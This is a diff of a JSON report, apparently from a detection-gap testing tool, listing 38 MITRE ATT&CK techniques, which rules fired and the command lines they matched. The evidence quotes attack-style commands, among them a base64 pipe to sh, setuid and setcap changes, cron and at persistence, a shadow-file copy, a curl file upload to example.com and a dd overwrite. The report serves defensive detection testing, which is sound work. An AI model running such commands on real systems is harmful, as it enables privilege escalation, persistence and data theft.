@@ -5,12 +5,12 @@
   "generated_at": "2026-08-11T00:00:00+00:00",
   "tool_versions": {},
   "summary": {
-    "techniques": 5,
-    "detected": 3,
-    "gaps": 2,
+    "techniques": 38,
+    "detected": 26,
+    "gaps": 12,
     "gaps_by_type": {
-      "base_rate": 1,
-      "rule": 1
+      "base_rate": 5,
+      "rule": 7
     }
   },
   "techniques": [
@@ -114,14 +114,14 @@
         "c21c4eaa-ba2e-419a-92b2-8371703cbe21"
       ],
       "matched_event_ids": [
-        "ev_8676a61a4976881c",
-        "ev_54be21732e201e9c"
+        "ev_d5ef6344d21df72a",
+        "ev_1864a606bfa34d98"
       ],
       "evidence": [
         {
           "rule_id": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
           "rule_title": "Setuid and Setgid",
-          "event_id": "ev_8676a61a4976881c",
+          "event_id": "ev_d5ef6344d21df72a",
           "matched_fields": {
             "CommandLine": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
           }
@@ -129,7 +129,7 @@
         {
           "rule_id": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
           "rule_title": "Setuid and Setgid",
-          "event_id": "ev_54be21732e201e9c",
+          "event_id": "ev_1864a606bfa34d98",
           "matched_fields": {
             "CommandLine": "sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid"
           }
@@ -153,6 +153,967 @@
       "firing_rules": [],
       "matched_event_ids": [],
       "evidence": []
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "42df45e7-e6e9-43b5-8f26-bec5b39cc239"
+      ],
+      "matched_event_ids": [
+        "ev_99347bd29b34f011"
+      ],
+      "evidence": [
+        {
+          "rule_id": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+          "rule_title": "System Information Discovery",
+          "event_id": "ev_99347bd29b34f011",
+          "matched_fields": {
+            "Image": "/usr/bin/uname"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa"
+      ],
+      "matched_event_ids": [
+        "ev_89be905f29990329",
+        "ev_9bfec3c43746c75b"
+      ],
+      "evidence": [
+        {
+          "rule_id": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+          "rule_title": "System Network Discovery - Linux",
+          "event_id": "ev_89be905f29990329",
+          "matched_fields": {
+            "CommandLine": "sh -c cat /etc/resolv.conf"
+          }
+        },
+        {
+          "rule_id": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+          "rule_title": "System Network Discovery - Linux",
+          "event_id": "ev_9bfec3c43746c75b",
+          "matched_fields": {
+            "CommandLine": "cat /etc/resolv.conf"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1069.001",
+      "name": "Permission Groups Discovery: Local Groups",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "676381a6-15ca-4d73-a9c8-6a22e970b90d"
+      ],
+      "matched_event_ids": [
+        "ev_49618fc95342c4c1"
+      ],
+      "evidence": [
+        {
+          "rule_id": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+          "rule_title": "Local Groups Discovery - Linux",
+          "event_id": "ev_49618fc95342c4c1",
+          "matched_fields": {
+            "Image": "/usr/bin/groups"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1518.001",
+      "name": "Software Discovery: Security Software Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "c9d8b7fd-78e4-44fe-88f6-599135d46d60"
+      ],
+      "matched_event_ids": [
+        "ev_5858e4f5b5f888b7"
+      ],
+      "evidence": [
+        {
+          "rule_id": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+          "rule_title": "Security Software Discovery - Linux",
+          "event_id": "ev_5858e4f5b5f888b7",
+          "matched_fields": {
+            "CommandLine": "grep falcond /etc/passwd",
+            "Image": "/usr/bin/grep"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72"
+      ],
+      "matched_event_ids": [
+        "ev_75f18b83c6169173"
+      ],
+      "evidence": [
+        {
+          "rule_id": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+          "rule_title": "File and Directory Discovery - Linux",
+          "event_id": "ev_75f18b83c6169173",
+          "matched_fields": {
+            "Image": "/usr/bin/find"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "base_rate",
+      "expected_gap_type": "base_rate",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1518",
+      "name": "Software Discovery",
+      "tactics": [
+        "Discovery"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "ba592c6d-6888-43c3-b8c6-689b8fe47337"
+      ],
+      "matched_event_ids": [
+        "ev_5d3bb2fa36bbf0ac"
+      ],
+      "evidence": [
+        {
+          "rule_id": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+          "rule_title": "Linux Base64 Encoded Pipe to Shell",
+          "event_id": "ev_5d3bb2fa36bbf0ac",
+          "matched_fields": {
+            "CommandLine": "sh -c echo bHM= | base64 -d | sh"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1222.002",
+      "name": "Linux and Mac File and Directory Permissions Modification",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "34979410-e4b5-4e5d-8cfb-389fdff05c12"
+      ],
+      "matched_event_ids": [
+        "ev_00c8176d1086e85f"
+      ],
+      "evidence": [
+        {
+          "rule_id": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+          "rule_title": "Remove Immutable File Attribute",
+          "event_id": "ev_00c8176d1086e85f",
+          "matched_fields": {
+            "CommandLine": "chattr -i /tmp/redgap_imm",
+            "Image": "/usr/bin/chattr"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57"
+      ],
+      "matched_event_ids": [
+        "ev_907d693f64ab5cec",
+        "ev_7b6fed8a1619720b"
+      ],
+      "evidence": [
+        {
+          "rule_id": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+          "rule_title": "File Deletion",
+          "event_id": "ev_907d693f64ab5cec",
+          "matched_fields": {
+            "Image": "/usr/bin/shred"
+          }
+        },
+        {
+          "rule_id": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+          "rule_title": "File Deletion",
+          "event_id": "ev_7b6fed8a1619720b",
+          "matched_fields": {
+            "Image": "/usr/bin/rm"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1497.001",
+      "name": "Virtualization/Sandbox Evasion: System Checks",
+      "tactics": [
+        "Defense Evasion"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1059",
+      "name": "Command and Scripting Interpreter",
+      "tactics": [
+        "Execution"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 2,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "8c1a5675-cb85-452f-a298-b01b22a51856"
+      ],
+      "matched_event_ids": [
+        "ev_e75f11a4f30dafaa"
+      ],
+      "evidence": [
+        {
+          "rule_id": "8c1a5675-cb85-452f-a298-b01b22a51856",
+          "rule_title": "Suspicious Invocation of Shell via AWK - Linux",
+          "event_id": "ev_e75f11a4f30dafaa",
+          "matched_fields": {
+            "CommandLine": "awk BEGIN {system(\"/bin/sh -c id\")}",
+            "Image": "/usr/bin/mawk"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactics": [
+        "Execution"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "bed978f8-7f3a-432b-82c5-9286a9b3031a"
+      ],
+      "matched_event_ids": [
+        "ev_8740587fa4aa997b"
+      ],
+      "evidence": [
+        {
+          "rule_id": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+          "rule_title": "Shell Invocation via Env Command - Linux",
+          "event_id": "ev_8740587fa4aa997b",
+          "matched_fields": {
+            "CommandLine": "env /bin/sh -c id",
+            "Image": "/usr/bin/env"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1059.006",
+      "name": "Command and Scripting Interpreter: Python",
+      "tactics": [
+        "Execution"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "base_rate",
+      "expected_gap_type": "base_rate",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1053.003",
+      "name": "Scheduled Task/Job: Cron",
+      "tactics": [
+        "Execution",
+        "Persistence",
+        "Privilege Escalation"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "6b14bac8-3e3a-4324-8109-42f0546a347f"
+      ],
+      "matched_event_ids": [
+        "ev_f3c98a47305f8fcc"
+      ],
+      "evidence": [
+        {
+          "rule_id": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+          "rule_title": "Scheduled Cron Task/Job - Linux",
+          "event_id": "ev_f3c98a47305f8fcc",
+          "matched_fields": {
+            "CommandLine": "crontab /tmp/rgcron",
+            "Image": "/usr/bin/crontab"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1053.002",
+      "name": "Scheduled Task/Job: At",
+      "tactics": [
+        "Privilege Escalation",
+        "Execution",
+        "Persistence"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "d2d642d7-b393-43fe-bae4-e81ed5915c4b"
+      ],
+      "matched_event_ids": [
+        "ev_fcd5c2933900b77f",
+        "ev_54b890516dd6d221",
+        "ev_9e4c0c08ca40adc1"
+      ],
+      "evidence": [
+        {
+          "rule_id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+          "rule_title": "Scheduled Task/Job At",
+          "event_id": "ev_fcd5c2933900b77f",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        },
+        {
+          "rule_id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+          "rule_title": "Scheduled Task/Job At",
+          "event_id": "ev_54b890516dd6d221",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        },
+        {
+          "rule_id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+          "rule_title": "Scheduled Task/Job At",
+          "event_id": "ev_9e4c0c08ca40adc1",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1548",
+      "name": "Abuse Elevation Control Mechanism",
+      "tactics": [
+        "Privilege Escalation",
+        "Persistence"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 2,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "ed447910-bc30-4575-a598-3a2e49516a7a"
+      ],
+      "matched_event_ids": [
+        "ev_100b7cc319dd8ca6"
+      ],
+      "evidence": [
+        {
+          "rule_id": "ed447910-bc30-4575-a598-3a2e49516a7a",
+          "rule_title": "Linux Setuid Capability Set on a Binary via Setcap Utility",
+          "event_id": "ev_100b7cc319dd8ca6",
+          "matched_fields": {
+            "CommandLine": "setcap cap_setuid+ep /tmp/rgcap",
+            "Image": "/usr/sbin/setcap"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1546.004",
+      "name": "Event Triggered Execution: Unix Shell Configuration Modification",
+      "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "base_rate",
+      "expected_gap_type": "base_rate",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactics": [
+        "Persistence"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1552.001",
+      "name": "Unsecured Credentials: Credentials In Files",
+      "tactics": [
+        "Credential Access"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "fa4aaed5-4fe0-498d-bbc0-08e3346387ba"
+      ],
+      "matched_event_ids": [
+        "ev_8d3e5e47fcb613bf"
+      ],
+      "evidence": [
+        {
+          "rule_id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+          "rule_title": "Copy Passwd Or Shadow From TMP Path",
+          "event_id": "ev_8d3e5e47fcb613bf",
+          "matched_fields": {
+            "CommandLine": "cp /tmp/shadow /tmp/shadow.bak",
+            "Image": "/usr/bin/cp"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1003.008",
+      "name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "tactics": [
+        "Credential Access"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1552.004",
+      "name": "Unsecured Credentials: Private Keys",
+      "tactics": [
+        "Credential Access"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1560.001",
+      "name": "Archive Collected Data: Archive via Utility",
+      "tactics": [
+        "Collection"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "rule",
+      "expected_gap_type": "rule",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1005",
+      "name": "Data from Local System",
+      "tactics": [
+        "Collection"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": false,
+      "gap_type": "base_rate",
+      "expected_gap_type": "base_rate",
+      "unexpected": false,
+      "candidates_evaluated": 0,
+      "candidates_excluded": 0,
+      "firing_rules": [],
+      "matched_event_ids": [],
+      "evidence": []
+    },
+    {
+      "id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "tactics": [
+        "Command and Control"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "b86d356d-6093-443d-971c-9b07db583c68"
+      ],
+      "matched_event_ids": [
+        "ev_fefbf2e06148eb58"
+      ],
+      "evidence": [
+        {
+          "rule_id": "b86d356d-6093-443d-971c-9b07db583c68",
+          "rule_title": "Suspicious Curl Change User Agents - Linux",
+          "event_id": "ev_fefbf2e06148eb58",
+          "matched_fields": {
+            "CommandLine": "curl -A RedGap/1.0 http://example.com/",
+            "Image": "/usr/bin/curl"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1090",
+      "name": "Proxy",
+      "tactics": [
+        "Command and Control"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "72f4ab3f-787d-495d-a55d-68c2ff46cf4c"
+      ],
+      "matched_event_ids": [
+        "ev_3e585d11a6f6a1df",
+        "ev_dbc4d8fcd7d4edc4"
+      ],
+      "evidence": [
+        {
+          "rule_id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+          "rule_title": "Connection Proxy",
+          "event_id": "ev_3e585d11a6f6a1df",
+          "matched_fields": {
+            "CommandLine": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+          }
+        },
+        {
+          "rule_id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+          "rule_title": "Connection Proxy",
+          "event_id": "ev_dbc4d8fcd7d4edc4",
+          "matched_fields": {
+            "CommandLine": "env http_proxy=http://127.0.0.1:3128 true"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1567",
+      "name": "Exfiltration Over Web Service",
+      "tactics": [
+        "Exfiltration",
+        "Command and Control"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "00b90cc1-17ec-402c-96ad-3a8117d7a582"
+      ],
+      "matched_event_ids": [
+        "ev_a79022ddc41269be"
+      ],
+      "evidence": [
+        {
+          "rule_id": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+          "rule_title": "Suspicious Curl File Upload - Linux",
+          "event_id": "ev_a79022ddc41269be",
+          "matched_fields": {
+            "CommandLine": "curl --upload-file /etc/hostname http://example.com/",
+            "Image": "/usr/bin/curl"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1048.003",
+      "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "tactics": [
+        "Exfiltration"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "3f0f5957-04f8-4792-ad89-192b0303bde6"
+      ],
+      "matched_event_ids": [
+        "ev_bd7da375624c5636"
+      ],
+      "evidence": [
+        {
+          "rule_id": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+          "rule_title": "Python WebServer Execution - Linux",
+          "event_id": "ev_bd7da375624c5636",
+          "matched_fields": {
+            "CommandLine": "python3 -m http.server 8000",
+            "Image": "/usr/bin/python3.13"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1485",
+      "name": "Data Destruction",
+      "tactics": [
+        "Impact"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "2953194b-e33c-4859-b9e8-05948c167447"
+      ],
+      "matched_event_ids": [
+        "ev_c7ff594de63f6974"
+      ],
+      "evidence": [
+        {
+          "rule_id": "2953194b-e33c-4859-b9e8-05948c167447",
+          "rule_title": "DD File Overwrite",
+          "event_id": "ev_c7ff594de63f6974",
+          "matched_fields": {
+            "CommandLine": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+            "Image": "/usr/bin/dd"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactics": [
+        "Impact"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "de25eeb8-3655-4643-ac3a-b662d3f26b6b"
+      ],
+      "matched_event_ids": [
+        "ev_eb4fc8e072c9f28d"
+      ],
+      "evidence": [
+        {
+          "rule_id": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+          "rule_title": "Disable Or Stop Services",
+          "event_id": "ev_eb4fc8e072c9f28d",
+          "matched_fields": {
+            "CommandLine": "systemctl stop redgap-nonexistent.service",
+            "Image": "/usr/bin/systemctl"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1653",
+      "name": "Power Settings",
+      "tactics": [
+        "Persistence",
+        "Impact"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "c172b7b5-f3a1-4af2-90b7-822c63df86cb"
+      ],
+      "matched_event_ids": [
+        "ev_786e40597be48427"
+      ],
+      "evidence": [
+        {
+          "rule_id": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+          "rule_title": "Mask System Power Settings Via Systemctl",
+          "event_id": "ev_786e40597be48427",
+          "matched_fields": {
+            "CommandLine": "systemctl mask hibernate.target",
+            "Image": "/usr/bin/systemctl"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1565.001",
+      "name": "Data Manipulation: Stored Data Manipulation",
+      "tactics": [
+        "Impact"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "86157017-c2b1-4d4a-8c33-93b8e67e4af4"
+      ],
+      "matched_event_ids": [
+        "ev_a6bf52f79c4d73fe"
+      ],
+      "evidence": [
+        {
+          "rule_id": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+          "rule_title": "Potential Suspicious Change To Sensitive/Critical Files",
+          "event_id": "ev_a6bf52f79c4d73fe",
+          "matched_fields": {
+            "CommandLine": "sed -n 1p /etc/hosts",
+            "Image": "/usr/bin/sed"
+          }
+        }
+      ]
+    },
+    {
+      "id": "T1592.004",
+      "name": "Gather Victim Host Information: Client Configurations",
+      "tactics": [
+        "Reconnaissance"
+      ],
+      "executed": true,
+      "telemetry_present": true,
+      "detected": true,
+      "gap_type": "none",
+      "expected_gap_type": "none",
+      "unexpected": false,
+      "candidates_evaluated": 1,
+      "candidates_excluded": 0,
+      "firing_rules": [
+        "0f79c4d2-4e1f-4683-9c36-b5469a665e06"
+      ],
+      "matched_event_ids": [
+        "ev_0bc95cb60ceab58d"
+      ],
+      "evidence": [
+        {
+          "rule_id": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+          "rule_title": "Access of Sudoers File Content",
+          "event_id": "ev_0bc95cb60ceab58d",
+          "matched_fields": {
+            "CommandLine": "grep root /etc/sudoers",
+            "Image": "/usr/bin/grep"
+          }
+        }
+      ]
     }
   ]
 }
